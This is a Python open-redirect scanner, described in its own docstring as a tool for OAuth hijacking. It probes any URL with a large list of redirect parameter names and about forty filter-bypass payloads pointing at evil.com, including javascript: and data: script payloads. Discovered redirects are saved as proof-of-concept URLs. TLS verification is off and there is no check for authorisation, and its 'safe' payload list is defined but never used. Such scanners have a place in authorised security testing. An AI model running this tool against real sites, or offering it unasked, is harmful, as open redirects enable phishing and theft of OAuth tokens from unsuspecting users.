#!/usr/bin/env python3
"""
Open Redirect Scanner — Find redirect vulnerabilities for OAuth hijacking
Usage: python3 open_redirect.py <url>
"""

import sys
import json
import re
import requests
from urllib.parse import urlparse, urlencode, parse_qs, urljoin

requests.packages.urllib3.disable_warnings()

REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "redirect_url", "return", "return_url",
    "returnTo", "return_to", "next", "next_url", "url", "uri", "link",
    "goto", "go", "target", "dest", "destination", "forward", "forward_url",
    "ref", "referrer", "referer", "continue", "callback", "cb",
    "checkout_url", "returnUrl", "returnPath", "redirectPath",
    "to", "out", "view", "show", "page", "path", "file",
    "login", "logout", "signin", "signup", "auth",
    "rurl", "r_url", "success", "failure", "cancel",
    "origin", "site", "website", "web_url", "document",
    "open", "load", "window", "href", "location",
    "redir", "redir_url", "redirect_uri", "redirect_to",
    "move", "go_to", "jump", "action",
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "https://evil.com%00.example.com",
    "https://evil.com%0a.example.com",
    "https://evil.com%0d.example.com",
    "https://evil.com%09.example.com",
    "https://evil.com\\@example.com",
    "https://evil.com%5c@example.com",
    "https://example.com@evil.com",
    "https://example.com%40evil.com",
    "https://evil.com#example.com",
    "https://evil.com?example.com",
    "https://evil.com/.example.com",
    "https://evil.com\\example.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "//evil.com/%2f..",
    "https://evil.com/%2f..",
    "/\\evil.com",
    "//evil.com%2f%2f",
    "https://evil.com%2f%2f",
    "https://evil.com%00",
    "https://evil.com%0d%0a",
    "/%09/evil.com",
    "/%2f/evil.com",
    "/%5cevil.com",
    "/.evil.com",
    "//evil.com/.",
    "https://evil.com/../../",
    "https:evil.com",
    "https;url=evil.com",
    "https://evil.com/%2e%2e",
    "/redirect/https://evil.com",
    "/redirect?url=https://evil.com",
    "https://good.com/https://evil.com",
    "https://evil.com%23.example.com",
    "https://evil.com%3f.example.com",
    "https://example.com/../../evil.com",
    "https://example.com/..;/evil.com",
    "https://example.com;/evil.com",
]

# Safe test payloads (just check redirect behavior, don't use evil.com for actual testing)
SAFE_PAYLOADS = [
    "https://httpbin.org/redirect/1",
    "https://google.com",
    "//google.com",
    "/%09/google.com",
    "https://google.com%00.example.com",
    "https://example.com@google.com",
    "//google.com/%2f..",
    "/\\google.com",
]

def check_redirect(url, param, payload):
    """Check if a URL parameter causes an open redirect"""
    try:
        parsed = urlparse(url)
        
        # Build URL with payload
        separator = "&" if "?" in url else "?"
        test_url = f"{url}{separator}{param}={payload}"
        
        r = requests.get(test_url, timeout=10, verify=False, allow_redirects=False,
                        headers={"User-Agent": "Mozilla/5.0"})
        
        location = r.headers.get("Location", "")
        status = r.status_code
        
        # Check if redirect happened
        is_redirect = status in [301, 302, 303, 307, 308]
        
        if is_redirect and location:
            # Check if our payload is in the redirect
            if any(x in location.lower() for x in ["evil.com", "google.com", "evil", "attacker"]):
                return {
                    "vulnerable": True,
                    "param": param,
                    "payload": payload,
                    "status": status,
                    "location": location,
                    "url": test_url
                }
        
        return {"vulnerable": False, "param": param, "payload": payload, "status": status}
    except Exception as e:
        return {"vulnerable": False, "param": param, "error": str(e)}

def find_redirect_params(url):
    """Find potential redirect parameters in a URL"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    found = []
    
    for param in params:
        if any(rp in param.lower() for rp in REDIRECT_PARAMS):
            found.append(param)
    
    return found

def scan_url(url):
    """Scan URL for open redirect vulnerabilities"""
    print(f"\n{'='*60}")
    print(f"↗️  Open Redirect Scanner")
    print(f"Target: {url}")
    print(f"{'='*60}\n")
    
    # Check if URL has existing params
    existing_params = find_redirect_params(url)
    if existing_params:
        print(f"📌 Found redirect params: {', '.join(existing_params)}\n")
    
    # Get the page to find forms and links with redirect params
    print("📡 Fetching page to find redirect parameters...")
    try:
        r = requests.get(url, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        html = r.text
        
        # Find redirect params in HTML
        found_params = set()
        for param in REDIRECT_PARAMS:
            if param.lower() in html.lower():
                found_params.add(param)
        
        # Find params in URL patterns
        url_params = re.findall(r'[?&]([a-zA-Z_]+)=', html)
        for p in url_params:
            if any(rp in p.lower() for rp in REDIRECT_PARAMS):
                found_params.add(p)
        
        print(f"  Found {len(found_params)} potential redirect parameters\n")
    except Exception as e:
        print(f"  ❌ Error: {e}")
        found_params = set()
    
    # Add existing params
    found_params.update(existing_params)
    
    # Also test all common redirect params
    all_params = list(found_params) + [p for p in REDIRECT_PARAMS[:20] if p not in found_params]
    
    vulnerable = []
    results = []
    
    print(f"🔎 Testing {len(all_params)} parameters × {len(REDIRECT_PAYLOADS)} payloads...\n")
    
    for param in all_params:
        for payload in REDIRECT_PAYLOADS:
            result = check_redirect(url, param, payload)
            results.append(result)
            
            if result.get("vulnerable"):
                vulnerable.append(result)
                print(f"  🔴 VULNERABLE!")
                print(f"     Param: {param}")
                print(f"     Payload: {payload}")
                print(f"     Status: {result['status']}")
                print(f"     Redirect to: {result['location']}")
                print()
                break  # One vuln per param is enough
    
    # Summary
    print(f"\n{'='*60}")
    print(f"📊 OPEN REDIRECT RESULTS")
    print(f"{'='*60}")
    print(f"Parameters tested: {len(all_params)}")
    print(f"Vulnerable: {len(vulnerable)}")
    
    if vulnerable:
        print(f"\n🔴 OPEN REDIRECTS FOUND:")
        for v in vulnerable:
            print(f"\n  Parameter: {v['param']}")
            print(f"  Redirect: {v['location']}")
            print(f"  PoC: {v['url'][:100]}")
    else:
        print("\n✅ No open redirects found")
    
    # Save
    import os
    os.makedirs("output", exist_ok=True)
    domain = urlparse(url).netloc.replace(".", "_")
    outfile = f"output/redirect_{domain}.json"
    with open(outfile, "w") as f:
        json.dump(vulnerable, f, indent=2)
    print(f"\n💾 Saved to {outfile}")
    
    return vulnerable

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 open_redirect.py <url>")
        print("Example: python3 open_redirect.py https://example.com/login")
        sys.exit(1)
    scan_url(sys.argv[1])
